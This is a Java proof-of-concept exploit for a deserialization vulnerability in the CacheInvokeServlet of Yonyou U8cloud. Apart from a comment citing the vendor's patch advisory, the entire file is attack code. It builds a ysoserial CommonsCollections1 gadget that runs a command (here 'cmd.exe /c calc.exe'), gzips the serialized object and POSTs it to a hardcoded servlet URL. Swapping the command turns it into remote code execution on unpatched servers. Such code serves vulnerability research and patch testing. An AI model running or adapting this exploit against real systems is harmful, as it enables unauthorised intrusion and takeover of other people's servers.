package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.*;
import java.util.zip.GZIPOutputStream;

/**
 * 漏洞：
 * U8cloud所有版本CacheInvokeServlet反序列化漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea
 */
public class CacheInvokeServlet_deserialize {

    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/servlet/~iufo/com.ufsoft.iufo.web.appletinvoke.CacheInvokeServlet";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        GZIPOutputStream gos = new GZIPOutputStream(baos);
        ObjectOutputStream oos = new ObjectOutputStream(gos);
        oos.writeObject(obj);

        oos.close();
        gos.close();
        baos.close();

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, baos.toByteArray());

    }
}


